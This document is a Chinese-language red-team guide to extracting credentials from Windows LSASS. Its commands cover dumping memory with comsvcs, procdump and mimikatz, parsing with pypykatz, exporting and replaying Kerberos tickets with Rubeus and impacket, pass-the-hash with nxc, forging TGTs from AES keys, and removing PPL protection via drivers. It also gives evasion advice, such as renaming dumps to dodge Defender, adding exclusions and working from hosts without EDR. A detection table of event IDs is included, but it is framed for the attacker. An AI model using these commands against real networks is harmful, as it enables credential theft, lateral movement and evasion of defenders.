# LSASS 里的凭据物料：怎么 dump、怎么读、哪些真能重放

> 被 `competition-lsass-ticket-material` 引用。要点：**LSASS 里不是「一堆密码」，是五种不同性质的东西**，
> 每种能用的地方完全不同。dump 成功不等于拿到可重放材料；拿到材料不等于目标服务接受。
>
> 本文结构：物料分类 → dump 方法 → 读取命令 → 票据提取与复用 → PPL/Credential Guard 下的现实 → 验伤与检测。

## 一、先分清 LSASS 里的五种物料

| 物料 | 来自哪个 provider | 形态 | 能用在哪 |
| --- | --- | --- | --- |
| **NT 哈希（NTLM）** | `msv1_0` | 16 字节 hex | PtH（SMB/WMI/RDP 受限）、Overpass-the-Hash、DCSync 前置 |
| **明文密码** | `wdigest`（需开启）、`kerberos`（部分登录类型）、`tspkg`、`ssp` | 字符串 | 直接登录、密码复用、解密其他存储 |
| **TGT / 服务票** | `kerberos` | `.kirbi`（KRB-CRED） | PtT、委派、跨服务重放 |
| **Kerberos 长期密钥（AES256/AES128/RC4）** | `kerberos`（`ekeys`） | 32/16 字节 | 伪造票据（Overpass、银票）、离线解 PAC |
| **DPAPI 相关（用户主密钥缓存）** | `dpapi` | masterkey | 见 `dpapi-credential-chain.md` |

**判据一句话**：
- 有 **哈希** → 能 PtH，但**不能**用于 Kerberos 服务（除非 Overpass 换 TGT）；
- 有 **TGT** → 能访问**该 TGT 允许的**所有服务（含跨主机），但不能改密码；
- 有 **AES key** → 能离线伪造该账号的票（含银票），且**不需要接触 DC**；
- 有 **明文** → 什么都能做，最值钱。

## 二、dump 的四种方法（按可用性排序）

### 方法 1：comsvcs.dll MiniDump（系统自带，无需落地工具）

```cmd
:: 先找到 lsass 的 PID
tasklist /fi "imagename eq lsass.exe"

:: 用系统自带的 comsvcs.dll 导出完整内存
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 644 C:\Windows\Temp\lsass.dmp full
```

要点：
- **必须是管理员**，且进程需有 `SeDebugPrivilege`；
- 第二个参数是 **PID（十进制）**，写错会 dump 到别的进程；
- 输出路径要可写（`C:\Windows\Temp` 一般可写）；
- 这条命令**命令行本身就是最强告警特征**（见第六节）。

### 方法 2：procdump（Sysinternals，签名合法）

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

`-ma` = full dump。`-accepteula` 不可省，否则会挂起等交互。
这条常被 EDR 按「procdump 抓 lsass」直接拦（ASR 规则或行为规则）。

### 方法 3：任务管理器 / 资源监视器（GUI，最不容易被拦）

任务管理器 → 详细信息 → 选中 `lsass.exe` → 右键「创建转储文件」。
生成在 `%TEMP%\lsass.DMP`。这条路**没有命令行**，只留文件创建事件。
前提：**PPL 未开启**（开了会提示「拒绝访问」）。

### 方法 4：直接读内存（不落盘，噪声最低但最复杂）

用 `mimikatz` 的 `sekurlsa::logonpasswords`（在线读取，不产生 dump 文件）：

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "sekurlsa::tickets /export" "exit"
```

**这是最常用的方式**，因为一次能拿全五类物料。代价是 mimikatz 本体落地（除非反射加载）。

### 落地文件最小的顺序

1. 优先 `sekurlsa::logonpasswords`（在线，不落 dump）
2. 其次 `comsvcs` MiniDump（系统自带，不落工具）
3. 再其次 `procdump`
4. 最后才是自定义 dumper

## 三、读 dump：三类工具

### mimikatz 读 minidump

```cmd
mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

`sekurlsa::minidump` 必须**先切换**到 dump 文件，之后的 `sekurlsa::*` 全部作用于该文件。
切回来要用 `sekurlsa::minidump` 重新指向 live（或者重启 mimikatz）。

### pypykatz（Linux 侧，离线，最省事）

```bash
pypykatz lsa minidump lsass.dmp > lsass_parsed.txt

# 只提取票据
pypykatz lsa minidump lsass.dmp -o ./tickets/ --kerberos-dir ./tickets/

# JSON 便于后续处理
pypykatz lsa minidump lsass.dmp -j > lsass.json
```

### 手工看（当工具被环境卡住时）

`strings -el lsass.dmp | grep -i "password"` 只能碰运气；
真正的结构化读取要看 `msv1_0` 的 `LogonSessionList` 双向链表（pypykatz 已实现）。
不适合手搓，只在验证工具输出时用。

## 四、读出来的东西长什么样，怎么判读

### `sekurlsa::logonpasswords` 的典型输出

```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2026/11/14 9:12:03
SID               : S-1-5-18          ← 机器账号的会话是 SYSTEM；普通服务是 S-1-5-20

        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : CORP
         * NTLM     : 8f3a...（机器账号哈希，很值钱）
        kerberos :
         * Username : DC01$
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac   b1c2...（可用于银票）

Authentication Id : 0 ; 43912 (00000000:0000ab88)
Session           : Interactive from 2
User Name         : alice
Domain            : CORP
...
        msv :
         * NTLM     : 2b576acbe6bcfda7294d6bd18041b8fe
        wdigest :
         * Password : (null)        ← Win8.1+ 默认不缓存明文
        kerberos :
         * Password : Passw0rd!2026  ← 交互登录时常有明文
         * Key List : aes256_hmac ...
```

**判读规则**：

| 字段 | 有值意味着 | 没有意味着 |
| --- | --- | --- |
| `msv` 的 `NTLM` | 有该账号 NT 哈希 | 该会话是网络登录（`NETWORK`），哈希不落地 |
| `wdigest` 的 `Password` | 明文在内存 | 默认关闭（`UseLogonCredential=0`） |
| `kerberos` 的 `Password` | 明文缓存（交互/凭据管理器登录） | 该会话是纯票证登录 |
| `kerberos` 的 `Key List` | AES/RC4 长期密钥 | 极少缺失 |
| `tspkg` / `ssp` | RDP/凭据提供者的明文 | — |
| `cloudap` | Azure AD 相关 token（若混合加入） | — |

**关键判断**：**网络登录（Type 3）不产生可提取的 NT 哈希**。
这就是为什么「从文件服务器 dump 出域管哈希」经常失败——域管是网络登录进来的，
LSASS 里只有他的 TGT 和会话密钥，没有 NT 哈希（除非他用了交互式 RDP）。

### `sekurlsa::ekeys`（最被低估的一条）

```cmd
mimikatz.exe "sekurlsa::ekeys" "exit"
```

输出每个会话的 `aes256_hmac` / `aes128_hmac` / `des3_hmac` / `rc4_hmac_nt`。
拿到 AES256 key 后**可以离线伪造该账号的 TGT**（Rubeus `asktgt /aes256:`），
**不需要 DC 上也**不需要知道密码——这是 Overpass-the-Hash 的 Kerberos 版本。

### `sekurlsa::tickets /export`

```cmd
mimikatz.exe "sekurlsa::tickets /export" "exit"
:: 在当前目录生成 [tid]-[luid]-[0]-[principal]@[spn]-[service].kirbi
```

**注意路径名里的 `@` 和 `$`**——Windows 文件名合法但 shell 里要引号。

### 读域缓存哈希（不是 LSASS，但常同一批动作）

```cmd
mimikatz.exe "lsadump::cache" "exit"
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL | grep -i '\$DCC2\$'
```

`msCacheV2` 用 `hashcat -m 2100`。缓存条目数由 `CachedLogonsCount` 决定（默认 10），
**这 10 个往往包含域管**——这是从「本地管理员」跳到「域账号」最短的路。

## 五、票据的提取与复用

### 提取

```cmd
:: mimikatz 导出全部
mimikatz.exe "sekurlsa::tickets /export" "exit"

:: Rubeus 导出（更细，可按 LUID/服务筛）
Rubeus.exe dump /nowrap /service:krbtgt
Rubeus.exe dump /luid:0x3e7 /service:cifs

:: 本机 klist（只看当前会话，不含其他用户）
klist -v
```

### 格式转换

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### 重放（Windows 侧）

```cmd
:: 把票注入当前会话（Rubeus）
Rubeus.exe ptt /ticket:doIF...（base64 票据，/nowrap 输出的就是）

:: 或从文件
Rubeus.exe ptt /ticket:C:\temp\admin@krbtgt-CORP.LOCAL.kirbi

:: 验证：看当前会话的票
klist
```

### 重放（Linux 侧）

```bash
export KRB5CCNAME=/tmp/admin.ccache
klist
impacket-psexec -k -no-pass dc01.corp.local
impacket-smbclient -k -no-pass //dc01.corp.local/c$
```

### 票据物料必须记录的字段

```
principal      票据属于谁
type           TGT / 服务票
spn            服务票的目标 SPN（TGT 写 krbtgt）
flags          forwardable / renewable / proxiable
enctype        0x17=RC4, 0x12=AES256, 0x11=AES128
start/end      有效期（默认 10 小时，续期 7 天）
luid           来自哪个登录会话（对应哪个用户）
source         从哪个 dump / 哪个 LUID
accepting      哪个服务接受了它
```

## 六、验伤：怎么证明「物料真的能重放」

| 层 | 证据 | 反例 |
| --- | --- | --- |
| L1 有材料 | `sekurlsa::logonpasswords` 出现 NTLM/TGT | 只看到 `(null)` 的字段 → 该会话没缓存这个 |
| L2 被接受 | 目标主机 **4624 Type 3** + `Authentication Package` 匹配 | 本地 `klist` 有票但 `psexec -k` 报 `KRB_AP_ERR_MODIFIED`（票的会话密钥不对） |
| L3 拿到能力 | `nxc ... --shares` 列目录 / `--sam` 读 SAM / RDP 进桌面 | 登录成功但 `whoami /groups` 只有 `Domain Users` → 权限没到 |

**具体验伤命令**：

```bash
# 哈希
nxc smb 10.0.0.30 -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -d corp.local

# 票据
export KRB5CCNAME=/tmp/administrator.ccache
impacket-smbclient -k -no-pass //10.0.0.30/c$ -c 'ls'

# AES key（伪造 TGT）
Rubeus.exe asktgt /user:administrator /aes256:<KEY> /domain:corp.local /dc:10.0.0.10 /ptt
```

**三个最典型的假阳性**：
1. **TGT 有效但目标不接受**：TGT 只能换**该域**的服务票；跨域要 referral TGT。`psexec` 报 `Server not found in Kerberos database` = SPN 拼错或服务未注册。
2. **PtH 成功但被降权**：`nxc` 显示 `(Pwn3d!)` 需要**管理员**；只有 `[+]` 说明只是认证通过。
3. **票据过期**：dump 出来的票可能是几小时前的，`klist` 会显示 `End Time` 已过。重放报 `KRB_AP_ERR_TKT_EXPIRED`。

## 七、PPL 与 Credential Guard：dump 不下去怎么办

### 先判断保护状态

```powershell
# LSA 保护（RunAsPPL）
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL
# 1 = 开启（LSASS 以 PPL 运行，普通句柄拿不到）

# Credential Guard（VBS）
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning, VirtualizationBasedSecurityStatus
# SecurityServicesRunning 含 1 = Credential Guard 开启
```

### 三种情况的对策

| 情况 | 表现 | 可行路径 |
| --- | --- | --- |
| **无保护** | 普通管理员即可 dump | 第二节任一方法 |
| **仅 PPL（RunAsPPL=1）** | `OpenProcess` 报 `0x5 拒绝访问`；任务管理器转储失败 | ① 用内核驱动去掉 PPL（mimidrv `!processprotect /process:lsass.exe /remove`，需签驱动或 BYOVD）；② 用 WerFault / PPLFault 类手法借 `WerFaultSecure.exe` 的 PPL 权限；③ 改注册表后**重启**（`RunAsPPL=0`），但这会留下明显痕迹且需重启 |
| **Credential Guard 开启** | LSASS 里**根本没有** NTLM 哈希与派生密钥（在 `LSAISO` 进程 / VBS enclave 里） | dump 出来也是空壳。此时唯一的路是**在线**方式：`sekurlsa::pth` 用已有会话、或者从其他未受保护主机取 |

**必须写进报告的一条**：`Credential Guard 开启时，dump LSASS 得到的是「结构完整但密钥为空」的数据`。
报告里若写「dump 了 LSASS 但没拿到哈希」，要先排除这一条，否则结论会被误判为「手法失败」。

### 另一个常见保护：ASR 规则

Defender 的 ASR 规则 **"Block credential stealing from the lsass.exe process"**
（GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`）会拦「进程打开 lsass 且 `GrantedAccess` 含读内存权限」。
表现是 `OpenProcess` 直接失败（不是事后告警）。此时 `procdump` / `comsvcs` 都会失败，
而任务管理器转储有时能过（签名与调用栈不同）。

## 八、检测视角（这一节决定动作快慢）

| 动作 | 日志 | 具体信号 |
| --- | --- | --- |
| 打开 lsass 读内存 | Sysmon **10**（ProcessAccess） | `TargetImage=lsass.exe` 且 `GrantedAccess` 为 `0x1010` / `0x1410` / `0x143a` / `0x1fffff` |
| 同上（无 Sysmon） | 安全 **4656 / 4663** | `Object Name` 含 `lsass.exe`，需开「对象访问」+「句柄操作」审计 |
| comsvcs dump | 安全 **4688** / Sysmon **1** | `CommandLine` 含 `comsvcs.dll` + `MiniDump` + 一个 PID |
| procdump | 4688 / Sysmon 1 | `CommandLine` 含 `procdump` + `lsass`；`-accepteula` 是强特征 |
| 任务管理器转储 | 4688（父进程 `Taskmgr.exe`）+ 文件创建 | `%TEMP%\lsass.DMP` 出现 |
| 票据导出 | Sysmon **11**（FileCreate） | 短时间内大量 `*.kirbi` 创建，文件名含 `@krbtgt` |
| 票据注入 | 安全 **4624** + `klist` 异常 | 同一进程出现多个不同 principal 的票 |
| 域缓存 dump | 4663 | 进程读 `C:\Windows\System32\config\SECURITY` |
| mimikatz 落地 | Sysmon 1 + 11 | 文件名 `mimikatz.exe`、命令行含 `sekurlsa::`、`privilege::debug` |

**响度排序**：`comsvcs` / `procdump` 命令行 = **极高**（一条规则必中）；
Sysmon 10 句柄 = **高**（几乎必报）；任务管理器转储 = **中**（只有文件创建 + 父进程线索）；
`sekurlsa` 在线读取 = **高**（句柄事件同样触发）。

**低噪声替代**：从**未部署 EDR 的机器**上做、或从**备份/VSS 里的 `ntds.dit` + 注册表 hive**离线取
（那是 `secretsdump` 的路径，不碰 lsass，见 `windows-pivot.md`）。

## 九、常见坑

1. **dump 了但没有哈希**。最常见原因是**该会话是网络登录（Type 3）**——只有票没有 NT 哈希。
   解决：去 dump **有交互登录**的机器（用户 RDP 过的、或服务账号以 `Password` 启动的）。
2. **Credential Guard 开着还在试**。见第七节，dump 出来的密钥是空的，会白忙一天。
3. **`sekurlsa::minidump` 之后忘了切回 live**。后续 `sekurlsa::pth` 之类会作用在 dump 上（无效）。
4. **票据文件名带 `@` 导致 shell 解析错**。一律加引号：`Rubeus.exe ptt /ticket:"C:\t\a@krbtgt-CORP.LOCAL.kirbi"`。
5. **以为 TGT 能直接访问所有主机**。TGT 要先换服务票；`psexec -k` 会自动换，但要求 SPN 正确注册。
   目标机器名用 FQDN（`dc01.corp.local`），用 IP 会导致 Kerberos 失败（无 SPN 匹配）。
6. **时钟偏移**。`KRB_AP_ERR_SKEW` / `Clock skew too great` → 先同步，再重试，不要怀疑票据。
7. **dump 文件被 Defender 当病毒删掉**。`lsass.dmp` 常在写入后几秒内被清；
   要么改扩展名（`.dmp` → `.bin`），要么先加排除目录（需管理员）。
8. **`wdigest` 没明文就断言「环境禁了明文」**。先查 `UseLogonCredential` 是否为 1；
   Win8.1+ 默认 0，这不是环境「加固」，是默认值。